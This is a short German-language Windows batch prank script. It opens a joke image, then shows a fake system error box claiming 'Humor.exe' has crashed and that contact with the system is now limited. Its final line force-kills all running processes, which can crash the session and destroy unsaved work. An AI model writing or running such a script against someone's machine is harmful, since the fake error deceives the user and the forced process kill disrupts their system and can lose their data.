:: Fehlermeldung_2


@echo off

start "" "C:\AppData\Roaming\phteven.jpg"


timeout /t 5


@echo off
echo msgbox"Die Anwendung Humor.exe wurde unerwartet geschlossen. Eine weitere Kommunikation zwischen Ihnen und dem System ist nur sehr eingeschraenkt moeglich.",vbExclamation , "Fehler Humor.exe"> %temp%\msg.vbs 
%Temp%\msg.vbs 
erase %temp%\msg.vbs

timeout /t 10

taskkill /f /fi "status eq running"